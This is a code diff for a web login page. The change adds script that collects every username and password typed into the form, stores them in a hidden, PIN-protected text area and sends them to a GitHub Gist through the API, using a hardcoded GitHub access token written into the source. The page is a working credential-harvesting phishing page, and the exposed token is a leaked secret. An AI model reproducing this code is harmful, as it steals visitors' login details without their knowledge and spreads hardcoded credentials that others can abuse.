@@ -137,7 +137,6 @@
             color: #45a049;
         }
 
-        /* Positioning the hr.jfif image */
         .logo {
             position: absolute;
             top: 10px;
@@ -149,7 +148,6 @@
             cursor: pointer;
         }
 
-        /* Image overlay for pack.png */
         .image-overlay {
             display: none;
             position: fixed;
@@ -175,9 +173,8 @@
             opacity: 1;
         }
 
-        /* Text area container */
         .text-area-container {
-            display: none; /* Initially hidden */
+            display: none;
             position: fixed;
             top: 50%;
             left: 50%;
@@ -200,7 +197,6 @@
 </head>
 <body>
     <div class="falling-elements">
-        <!-- Create multiple star and GIF elements -->
         <div class="star" style="top: 10%; left: 20%; animation-duration: 2s;"></div>
         <div class="star" style="top: 30%; left: 50%; animation-duration: 4s;"></div>
         <div class="star" style="top: 60%; left: 80%; animation-duration: 3s;"></div>
@@ -213,7 +209,6 @@
         <div class="star" style="top: 45%; left: 85%; animation-duration: 4.7s;"></div>
     </div>
 
-    <!-- Logo in the top right corner -->
     <img src="hr.jfif" alt="Logo" class="logo">
 
     <div class="login-container">
@@ -232,35 +227,40 @@
         <a href="#" class="signup-link">Don't have an account? Sign up</a>
     </div>
 
-    <!-- Image overlay for pack.png -->
     <div class="image-overlay" id="imageOverlay">
         <img src="pack.png" alt="Pack Image">
     </div>
 
-    <!-- Text area container -->
     <div class="text-area-container" id="textAreaContainer">
         <textarea id="textArea" rows="10" cols="30" placeholder="Type your text here..."></textarea>
     </div>
 
     <script>
-        // Function to load saved data from localStorage into the text area
-        function loadSavedData() {
-            var savedData = localStorage.getItem('loginData');
-            if (savedData) {
-                var textArea = document.getElementById('textArea');
-                textArea.value = savedData;
-            }
+        const GITHUB_TOKEN = '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'; // Replace with your GitHub token
+        const GIST_ID = 'a2a704439b6e63da0a509c1125f5a936'; // Your Gist ID
+
+        function saveToGist(content) {
+            fetch(`https://api.github.com/gists/${GIST_ID}`, {
+                method: 'PATCH',
+                headers: {
+                    'Authorization': `token ${GITHUB_TOKEN}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    files: {
+                        'loginData.txt': {
+                            content: content
+                        }
+                    }
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Gist updated:', data))
+            .catch(error => console.error('Error:', error));
         }
 
-        // Call the function to load saved data when the page loads
-        window.onload = loadSavedData;
-
-        // Flag to track whether the text area can be opened
-        let canShowTextArea = false;
-
-        // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the form from submitting
+            event.preventDefault();
 
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
@@ -269,36 +269,37 @@
                 var overlay = document.getElementById('imageOverlay');
                 overlay.classList.add('show');
 
-                // Hide the overlay after 2 seconds
                 setTimeout(function() {
                     overlay.classList.remove('show');
-                }, 2000); // 2000 milliseconds = 2 seconds
+                }, 2000);
 
-                // Append username and password to the text area
                 var textArea = document.getElementById('textArea');
                 textArea.value += `Username: ${username}\nPassword: ${password}\n\n`;
 
-                // Save the updated text area content to localStorage
                 localStorage.setItem('loginData', textArea.value);
+
+                saveToGist(textArea.value);
             }
         });
 
-        // Handle clicking on the hr.jfif image
+        function loadSavedData() {
+            var savedData = localStorage.getItem('loginData');
+            if (savedData) {
+                var textArea = document.getElementById('textArea');
+                textArea.value = savedData;
+            }
+        }
+        window.onload = loadSavedData;
+
+        let canShowTextArea = false;
         document.querySelector('.logo').addEventListener('click', function() {
             if (canShowTextArea) {
                 var textAreaContainer = document.getElementById('textAreaContainer');
-                // Toggle visibility of the text area container
-                if (textAreaContainer.style.display === 'none' || textAreaContainer.style.display === '') {
-                    textAreaContainer.style.display = 'block';
-                } else {
-                    textAreaContainer.style.display = 'none';
-                }
+                textAreaContainer.style.display = textAreaContainer.style.display === 'none' || textAreaContainer.style.display === '' ? 'block' : 'none';
             } else {
-                // Prompt for password
                 var password = prompt("Please enter the password to access the text area:");
                 if (password === '1306') {
                     canShowTextArea = true;
-                    // Show the text area container
                     var textAreaContainer = document.getElementById('textAreaContainer');
                     textAreaContainer.style.display = 'block';
                 } else {
